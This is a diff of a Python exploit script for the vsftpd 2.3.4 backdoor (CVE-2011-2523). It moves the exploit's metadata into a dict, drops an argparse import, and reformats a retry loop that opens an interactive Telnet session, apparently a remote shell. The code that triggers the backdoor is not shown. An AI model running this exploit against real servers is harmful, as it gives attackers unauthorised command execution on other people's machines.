@@ -1,15 +1,15 @@
 #!/usr/bin/python3
 
 from telnetlib import Telnet
-import argparse
 from signal import signal, SIGINT
 from sys import exit
 
-Exploit_Title = "vsftpd 2.3.4 - Backdoor Command Execution"
-Date = "9-04-2021"
-Version = "vsftpd 2.3.4"
-Tested_on = "debian"
-CVE = "CVE-2011-2523"
+about: dict = {"Exploit_Title": "vsftpd 2.3.4 - Backdoor Command Execution",
+               "Date": "9-04-2021",
+               "Version": "vsftpd 2.3.4",
+               "Tested_on": "debian",
+               "CVE": "CVE-2011-2523"
+               }
 
 
 def handler(signal_received, frame):
@@ -45,8 +45,8 @@ def main(host: str = ""):
             print("__________________________")
             tn2.interact()
         except Exception as es:
-            print("\n" + "-"*20, "\nException raised:\n", es)
-            print("\n" + "-"*20, f"\n{exp_try}]Retrying...")
+            print("\n" + "-" * 20, "\nException raised:\n", es)
+            print("\n" + "-" * 20, f"\n{exp_try}]Retrying...")
             exp_try += 1
         else:
             break
